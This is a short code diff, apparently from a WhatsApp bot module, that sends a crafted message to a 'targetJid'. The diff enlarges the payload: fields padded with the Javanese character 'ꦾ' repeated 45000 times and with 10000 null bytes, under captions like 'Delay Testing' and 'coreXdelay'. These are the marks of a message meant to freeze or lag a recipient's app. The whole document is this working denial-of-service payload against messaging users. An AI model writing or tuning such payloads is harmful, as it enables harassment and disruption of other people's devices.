@@ -22,15 +22,15 @@ export default {
                 locationMessage: {
                   degreesLatitude: 3.139,
                   degreesLongitude: 101.6869,
-                  name: "Delay Testing " + "ꦾ".repeat(50),
+                  name: "Delay Testing " + "ꦾ".repeat(45000),
                   address: "📍 Kuala Lumpur",
                 },
               },
               body: {
-                text: "X-delay " + "ꦾ".repeat(50),
+                text: "X-delay " + "ꦾ".repeat(45000),
               },
               nativeFlowMessage: {
-                messageParamsJson: "\u0000".repeat(100),
+                messageParamsJson: "\u0000".repeat(10000),
               },
               contextInfo: {
                 participant: targetJid,
@@ -45,7 +45,7 @@ export default {
                     fileLength: 1000,
                     caption: "coreXdelay",
                     pageCount: 1,
-                    mediaKey: "\u0000".repeat(10),
+                    mediaKey: "\u0000".repeat(10000),
                     jpegThumbnail: Buffer.from(""),
                   },
                 },
